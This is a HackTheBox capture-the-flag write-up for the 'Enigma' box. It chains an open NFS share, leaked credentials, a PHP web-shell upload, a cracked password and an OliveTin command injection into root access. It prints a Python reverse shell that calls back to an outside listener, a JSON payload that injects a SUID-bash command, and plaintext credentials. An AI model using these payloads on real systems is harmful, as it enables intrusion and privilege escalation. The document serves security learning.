---
title: "HTB - Enigma"
date: "2026-09-15"
description: "NFS, OpenSTAManager, OliveTin"
platform: "HackTheBox"
difficulty: "Easy"
tags: ["htb", "writeup", "nfs", "php", "mysql", "olivetin", "privesc"]
---

# HTB - Enigma

Enigma is a Linux box built around a realistic IT support scenario: a managed services company running an internal helpdesk/ERP tool (OpenSTAManager), a mail server, and NFS shares for onboarding new employees. The path to root chains together information disclosure, a file upload flaw, credential reuse, and a vulnerable local automation tool — a good example of how a full compromise rarely needs a single "big" bug, just several small ones lined up correctly.

## TL;DR

An anonymously mountable NFS share leaked an admin password that had been sent internally but not yet claimed. That password unlocked the OpenSTAManager admin panel, whose update mechanism accepted an unvalidated PHP file, giving remote code execution as `www-data`. From there, plaintext database credentials in the application's config file exposed a user's password hash, which cracked instantly against rockyou.txt and handed over a real SSH-equivalent shell. Root came from a locally-bound automation API (OliveTin) with a classic unsanitized command injection in one of its parameters.

## Recon

Starting with a full TCP port scan:

```bash
nmap -p- -T4 -Pn 10.129.239.191
```

The host exposed a fairly wide surface: SSH, HTTP, a full mail stack (POP3/POP3S/IMAP/IMAPS), RPC/NFS services, and a handful of high, seemingly random ports that turned out to belong to `rpcbind`'s dynamic port allocation (mountd, nlockmgr, status).

`whatweb` against the HTTP service identified an nginx-fronted site branded "Enigma Corp — Managed IT Solutions." Directory brute-forcing with feroxbuster didn't turn up anything beyond the main page — the web app itself wasn't going to be the entry point, at least not directly.

The RPC ports were the more interesting lead. Querying `rpcinfo` confirmed an active NFS service, and:

```bash
showmount -e 10.129.239.191
```

returned an export, `/srv/nfs/onboarding`, open to any client (`*`). No authentication, no IP restriction.

## Foothold

### Finding credentials on the NFS share

Mounting the export locally exposed exactly what the name suggested: onboarding material for new employees. Among the files was a PDF containing a freshly issued password for a user named `kevin`.

Digging further into the same share turned up mail correspondence. One thread mentioned that another employee, `sarah`, had been provisioned with the same password pattern used for `kevin` — a sign of password reuse across the organization rather than a one-off mistake.

I checked Sarah's mailbox directly through the company's webmail (Roundcube), reachable at `mail001.enigma.htb`. Sitting in her inbox was an email from IT support confirming access credentials for the OpenSTAManager panel — an admin account she hadn't gotten around to using yet:

```
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

That's the value of checking mail servers during recon: even when a web application itself looks solid, the humans using it often leave the real way in sitting in their inbox.

### From admin panel to a shell

OpenSTAManager is an open-source ERP/CRM tool, and like a lot of internal business software, it ships with an update mechanism that lets an admin upload new versions or patches through the web UI. That upload path didn't validate file content strictly enough — a PHP file uploaded as an "update" landed on disk, inside a web-accessible directory, without being registered in the application's own file-tracking database.

That last detail mattered. The application has a file-integrity check that flags files present on disk but missing from its database as "orphaned." Running that check was actually how I confirmed the web shell had landed successfully — `SHELL.php`, 29 bytes, sitting unaccounted for in the filesystem. Invisible to the normal UI, but still servable and executable by the web server.

Triggering it was a simple direct request with a command parameter:

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.78\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;pty.spawn(\"/bin/bash\")%27"
```

A listener on port 4444 caught a shell as `www-data`.

## User

With code execution on the box, the next obvious move was to look at how the application itself authenticates to its database — that information has to live somewhere readable by the web server. Sure enough, `config.inc.php` had the MySQL credentials in plaintext:

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager
```

The `zz_users` table held two accounts: `admin` and `haris`, both with bcrypt hashes. I pulled `haris`'s hash and threw it at hashcat with rockyou.txt:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

It cracked in seconds — `bestfriends`. Weak enough to fall to a standard wordlist despite bcrypt's cost factor, which says more about password choice than about the hashing algorithm. That password worked for the actual OS account too:

```bash
su - haris
```

`user.txt` sitting right there in the home directory confirmed the foothold was solid.

## Root

Root required a bit more digging than the usual "check sudo -l and SUID binaries" routine — neither turned up anything unusual on this box. What did stand out, once I checked locally-bound network services, was port 1337 answering only on `127.0.0.1`: OliveTin, a lightweight self-hosted dashboard that lets admins trigger predefined shell actions through a web API.

Querying its dashboard endpoint listed the available actions, and one in particular stood out — "Backup Database" — running with root privileges and taking `db_user`, `db_pass`, and `db_name` as parameters. That's the kind of action that almost always shells out to `mysqldump` or similar under the hood, which means whatever gets passed as those parameters is at serious risk of ending up concatenated straight into a command.

Testing that theory meant getting a single quote and a semicolon into the `db_pass` value. Raw `curl` from the shell mangled the escaping badly enough that I switched to a small Python script instead, to control the JSON payload precisely:

```python
import urllib.request, json

url = 'http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction'
payload = {
    'bindingId': 'backup_database',
    'arguments': [
        {'name': 'db_user', 'value': 'root'},
        {'name': 'db_pass', 'value': "'; cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash; #"},
        {'name': 'db_name', 'value': 'information_schema'}
    ]
}

req = urllib.request.Request(
    url,
    data=json.dumps(payload).encode(),
    headers={'Content-Type': 'application/json'}
)
urllib.request.urlopen(req)
```

The injected payload broke out of the intended command, copied `/bin/bash` to `/tmp/rootbash`, and set the SUID bit on it — all running as root, courtesy of OliveTin's action. From there:

```bash
/tmp/rootbash -p
whoami
# root
```

`root.txt` confirmed full compromise.

## Reflections

What made Enigma satisfying wasn't any single exploit — none of the individual steps were particularly exotic. It was the chain: an overlooked NFS export led to credentials, credentials led to an upload feature that trusted its own file registry a bit too much, a config file leaked DB access, a weak password fell to a wordlist in seconds, and a "convenience" automation tool turned out to be the actual root cause.

A few habits this box reinforced for me:

- **Check NFS early.** `showmount -e` takes two seconds and is easy to skip when the web app looks like the obvious target.
- **"Not showing in the UI" isn't a security boundary.** The orphaned web shell was invisible to normal users but perfectly reachable by URL.
- **Always re-scan locally once you have a shell.** Services bound to `127.0.0.1` are still your problem — OliveTin never showed up in the initial nmap because it was never meant to be reachable from outside.
- **Automation and orchestration tools are a recurring privesc pattern.** Anything that runs predefined actions as root based on user-supplied parameters deserves the same scrutiny as a web form — because that's exactly what it is.